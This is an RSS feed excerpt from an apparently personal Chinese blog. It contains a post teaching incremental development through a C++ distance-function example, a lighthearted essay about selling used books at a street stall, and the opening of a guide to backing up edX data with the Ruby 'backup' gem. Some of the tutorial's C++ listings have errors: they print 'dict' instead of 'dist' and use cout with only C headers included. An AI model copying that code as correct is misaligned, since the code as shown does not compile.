&lt;p&gt;在增量开发中，你首先设计系统可以运行的最简单版本。它甚至不接受任何数据输入，或者对数据进行处理，他也可以不产生输出。只需要成为一个坚实的骨架结构。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Fred Brooks(《人月神话》作者)甚至认为&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;应做好建造一个扔掉一个的准备&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;3&lt;/h2&gt;
&lt;p&gt;开源社区其实一直挺习惯这种做法的&lt;/p&gt;
&lt;p&gt;《大教堂与集市》中提到&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;优秀的程序员知道写什么，卓越的程序员知道改写（和重用）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;"建设性懒惰”，他们知道人们要的是结果而不是勤奋，而从一个部分可行的方案开始，明显要比从零开始容易得多&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;虽然Linux中所有Minix代码最终都被移除或重写，但它在Linux成长初期确实起到了类似脚手架的作用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上是我做的读书摘记。&lt;/p&gt;
&lt;p&gt;你看，以上谈论的几点，如果你平时都混迹github的话，也许就是这样做的，当有某个需求时，用关键字去github搜下是否有类似项目，有的话，clone下来，以其为脚手架，先跑起来，在此基础上增量地做些自己的定制，如果跑不起来，就checkout回去，成功的话，又继续往前多迈一步，因为使用的是增量式开发，你能知道每次的错误肯定是新增的代码造成的，这样一来你是信心十足的前进，毫无后顾之忧&lt;/p&gt;
&lt;h2&gt;4&lt;/h2&gt;
&lt;p&gt;晚上在翻《How to Think Like a Computer Scientist: C++ version》 （中文版《像计算机科学家一样思考 C++版》）&lt;/p&gt;
&lt;p&gt;第5章谈到程序开发时，作者建议大家使用增量式开发。书中举得一个例子很棒，摘录过来，适合帮助新手理解增量式开发的过程&lt;/p&gt;
&lt;p&gt;我们面临这样一个任务：计算两点（x1,y1）和（x2,y2）之间的距离&lt;/p&gt;
&lt;p&gt;公式是简单的：distance = √((x2-x1)^2+(y2-y1)^2)&lt;/p&gt;
&lt;h3&gt;4.1&lt;/h3&gt;
&lt;p&gt;好的，我们开始写下骨架代码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mf"&gt;0.0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在这一阶段函数并没有做任何实质性的事情，但是尝试编译可以让我们在把函数变得更复杂之前确认是否却在语法错误。&lt;/p&gt;
&lt;h3&gt;4.2&lt;/h3&gt;
&lt;p&gt;为了测试这个新函数，我们需要调用它&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dist&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;1.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;6.0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;dict&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;一旦检查完函数定义的语法，就可以开始一次添加一行的代码进行增量开发了。在每次增量改变之后，就可以编译运行程序，用这种方法，在任何一个时间点我们都确切知道错误所在--刚添加的最后一行代码。&lt;/p&gt;
&lt;h3&gt;4.3&lt;/h3&gt;
&lt;p&gt;编译，运行，一切正常。这时你的信心在不断累积。下一步是用两个临时变量dx和dy存储x2-x1和y2-y1的差值&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;dx is &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;dy is &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mf"&gt;0.0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在此计算distance(1.0, 2.0, 4.0, 6.0)。其中参数的选择是有原因的，水平距离为3，垂直距离为4，所以两点间距离为5，当测试一个函数的时候，知道正确的结果是很有帮助的。在这里dx为3.0，dy为4.0&lt;/p&gt;
&lt;p&gt;编写完函数时，会删除输出语句，像这样的代码称为&lt;code&gt;支架代码&lt;/code&gt;，可以帮助正确地编写程序，但是它并不是最终代码的一部分。&lt;/p&gt;
&lt;h3&gt;4.4&lt;/h3&gt;
&lt;p&gt;下一步是对dx和dy做平方计算，我们使用简单快捷的直接与自身相乘。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dsquared&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;dsquared is &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;dsquared&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mf"&gt;0.0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在这个阶段可以再一次编译和运行程序，检查中间值是否正确&lt;/p&gt;
&lt;h3&gt;4.5&lt;/h3&gt;
&lt;p&gt;最后，用sqrt函数计算平方根，并返回结果&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dsquared&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqrt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dsquared&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;至此，主要的工作就完成了。&lt;/p&gt;
&lt;h3&gt;4.6&lt;/h3&gt;
&lt;p&gt;在main函数中，检查结果&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;math.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="nf"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dsquared&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dy&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqrt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dsquared&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;dist&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;distance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;1.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;6.0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;dict&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;熟练之后，一次可以编写和调试更多的行。&lt;/p&gt;
&lt;p&gt;总结下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从一个可以运行的程序开始，做小步，渐进的改进。在任何一点，如果出错，可以清楚地知道错误发生的地方&lt;/li&gt;
&lt;li&gt;使用临时变量存储中间结果，便于输出和检查。&lt;/li&gt;
&lt;li&gt;一旦程序正常运行，可能需要移除部分支架代码。记得加上注释使程序保持可读性。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此外可以结合git来管理代码，将没有问题的代码入库，保证代码安全的同时，可以随时切换到任意时间点。这样在渐进前进的同时就可以无所顾忌了&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 04 Jun 2015 00:00:00 +0000</pubDate><guid>tag:,2015-06-04:about-incremental-development.html</guid><category>code</category></item><item><title>想摆地摊</title><link>/sell-books-on-the-roadside.html</link><description>&lt;blockquote&gt;
&lt;p&gt;我能想到最浪漫的事，就是周末晚上去摆地摊&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;朋友分享了一个链接，读罢，举头望月，低头沉思，一番深思熟虑之后，终于拿定主意，周末去摆地摊卖书！&lt;/p&gt;
&lt;p&gt;不卖新的，不卖盗版的，就卖读过的旧书。每一本我都仔细检查，生怕里边夹了书信，或有见不得人的便签纸条。&lt;/p&gt;
&lt;p&gt;我都想好了，几点开业，几点收场。&lt;/p&gt;
&lt;p&gt;晚风湍似水，鬓影与衣香。&lt;/p&gt;
&lt;p&gt;月色温柔的时候就晚些回去，行人太少的时候就自顾自地看书，遇上城管就跑，遇到下雨就盖保鲜膜。&lt;/p&gt;
&lt;p&gt;遇上聊得来的，即便不买，也是非送一本不可的。&lt;/p&gt;
&lt;p&gt;如果Ta同我说起网络诗词，我就说你帮我照看下书摊，我去去就回，我飞也似的跑到附近的打印店，拔出U盘，一会儿工夫，回到书摊，说有劳啦，一手拿着冰棍，一手拿着一叠打印装订好的A4纸说，这是孟依依的《月出集》，这是醉卧长安《千山集》，这是小眉的《空花集》，这是柠檬味的冰棍，都是我顶喜欢的，拿着，不收你钱，冰棍钱也不收。&lt;/p&gt;
&lt;p&gt;如果Ta同我聊起古籍，Ta说你这里有《论语》吗，我头也不抬地说，真是抱歉啊，我不喜欢孔子呢，Ta接着说没有《论语》的话，有《论语心得》吗，我就说不好意思啊，我不卖畅销书呢，Ta抚掌而笑说，我喜欢不卖这些臭气熏天的书的摊子，Ta接着神秘兮兮地说，我猜你一定卖《庄子》《世说新语》《浮生六记》《幽梦影》也许还有《金瓶梅》对不对，我开心极了，却偏说不对不对，这些也是没有的，接着忍不住笑出来说，这些我都不卖的，我只送人，我都送你好不好，我猜你还喜欢张岱，李渔，袁枚对不对。Ta眉开眼笑说，这些也都送我的话，你就没书摆摊啦，我说这也无妨，明天换你拎着这堆书来摆摊，还从自家带来更多的书，我假装碰巧路过，你指不定就把它们全送我了，我失的那些书不正像塞翁失的那匹马么&lt;/p&gt;
&lt;p&gt;如果Ta同我聊起笛卡尔，我就问Ta，你是不是也读休谟，如果Ta点头，我克制不住激动，又不无同情地说，我上学时，也遭遇过他们，留下不可愈合的创伤，而后在叔本华那里找到过一些安慰，此后又颠沛流离，直到最近遇到分析哲学，发现它就是我一直期待的东西，可能治愈怀疑论的创伤。于是我一头扎进书堆，去找罗素和维特根斯坦。我一边找一边说“问题是通过消除而被解决的”&lt;/p&gt;
&lt;p&gt;真是期待周末啊，可是书呢，对啊书呢，我特么哪儿来的书呢，我这大半年都用的kindle啊。&lt;/p&gt;
&lt;p&gt;上一本纸质书是砖块厚的《代码大全》，大半年前买的，上上一本，就根本记不得了。&lt;/p&gt;
&lt;p&gt;火把已备，东风不来，颇为心塞。&lt;/p&gt;
&lt;p&gt;可是，还是想去摆地摊啊&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 04 Jun 2015 00:00:00 +0000</pubDate><guid>tag:,2015-06-04:sell-books-on-the-roadside.html</guid><category>thought</category></item><item><title>使用backup异地备份edX数据</title><link>/use-backup-for-edx.html</link><description>&lt;blockquote&gt;
&lt;p&gt;Don't put all your eggs in one basket&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;为了提升逼格，我决定使用英文版的的这句作为开头，尽管我最初想到的是中文版orz&lt;/p&gt;
&lt;p&gt;天灾人祸这种事，总归是有的。尽管服务器的灾难性故障不常发生，概率也比遇到鬼或是遇到爱情来得高些，将风险考虑在内总归是好的，所谓有备无患。如果你已经在自己的架构中将单点故障考虑进去了，就不必往下拉啦，继续舔酸奶盖去吧~如果你的云服务商已经考虑了单点故障，你也没啥好做啦。&lt;/p&gt;
&lt;p&gt;如果两者都没有，你应该请我喝杯星冰乐再往下拉。&lt;/p&gt;
&lt;p&gt;ps：我最近多是在处理性能优化，数据迁移，安全策略，系统稳定性这类事，简直是伪装成开发的运维orz&lt;/p&gt;
&lt;h1&gt;策略&lt;/h1&gt;
&lt;p&gt;采用异地备份来应对单点故障导致的数据丢失&lt;/p&gt;
&lt;h1&gt;最初的思路&lt;/h1&gt;
&lt;p&gt;首先明确我们需要备份哪些数据,关于edX数据，可以参考我此前的&lt;a href="http://wwj718.github.io/edx-data-migrate.html"&gt;这篇文章&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;一番深(hu)思(si)熟(luan)虑(xiang)之后，你会发现，我们关心的数据无非是数据库(mongodb/mysql)里存的，以及静态文件(/edx/var/edxapp/staticfiles)&lt;/p&gt;
&lt;p&gt;思路很简单，每天定时备份数据库和静态文件，将其同步到远程服务器。只保存最近3，5天的备份文件，逾期的删除&lt;/p&gt;
&lt;p&gt;这里需要注意的问题可能有三点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不要影响到用户使用，备份是消耗服务器资源的，会造成服务器压力，写个定时任务，让其在凌晨做&lt;/li&gt;
&lt;li&gt;采用增量同步的方式节省带宽&lt;/li&gt;
&lt;li&gt;任务完成后，给自己发个邮件，确定成功执行了&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;那么写个shell脚本基本就完事啦，主要可能涉及的工具：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mongodump&lt;/li&gt;
&lt;li&gt;mysqldump&lt;/li&gt;
&lt;li&gt;tar  &lt;/li&gt;
&lt;li&gt;scp/rsync&lt;/li&gt;
&lt;li&gt;crontab&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;backup闪亮登场&lt;/h1&gt;
&lt;p&gt;就在我shell脚本快写完的时候，在github上发现了这个东西：&lt;a href="https://github.com/backup/backup"&gt;backup&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;一言话概括就是&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Easy full stack backup operations on UNIX-like systems&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;稍微扫一眼&lt;a href="http://backup.github.io/backup/v4/"&gt;Overview&lt;/a&gt;,分分钟爱不释手啊。&lt;/p&gt;
&lt;p&gt;从文档中不难发现，backup本质上是对以上我们提到的工具做了封装。&lt;/p&gt;
&lt;p&gt;能不写shell，我是尽量不写shell的。&lt;/p&gt;
&lt;p&gt;先读下&lt;a href="http://backup.github.io/backup/v4/getting-started/"&gt;文档&lt;/a&gt;吧。&lt;/p&gt;
&lt;h2&gt;install backup&lt;/h2&gt;
&lt;p&gt;backup是ruby写的，使用gem安装。不得不说ruby的DSL能力真强啊&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo gem install backup&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;哦，顺便说下，我在ruby1.8.7和ruby1.9.3下都没成功，之后在ubuntu12.04上手动编译了ruby2.0.0才安装好backup。也是蛮诡异的，可能是我机器的问题，文档里说ruby1.8.7和ruby1.9.3应该都是没有问题的&lt;/p&gt;
&lt;h2&gt;backup demo&lt;/h2&gt;
&lt;p&gt;从一个简单的案例开始。  &lt;/p&gt;
&lt;p&gt;任务描述：备份我的home目录下的所有文件，同步到远程服务器的&lt;code&gt;~/backup_my_home&lt;/code&gt;目录，只保留最近的5个备份&lt;/p&gt;
&lt;p&gt;在shell里执行&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;backup generate:model --trigger backup_my_home \
  --archives --storages=&amp;#39;scp&amp;#39;  --compressor=&amp;#39;gzip&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;会生成:&lt;code&gt;Generated model file: '/home/USERNAME/Backup/models/backup_my_home.rb'&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;编辑以上文件就行&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# encoding: utf-8&lt;/span&gt;
&lt;span class="no"&gt;Model&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;:backup_my_home&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Description for backup_my_home&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;

  &lt;span class="n"&gt;archive&lt;/span&gt; &lt;span class="ss"&gt;:my_archive&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;archive&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
    &lt;span class="c1"&gt;# Run the `tar` command using `sudo`&lt;/span&gt;
    &lt;span class="c1"&gt;# archive.use_sudo&lt;/span&gt;
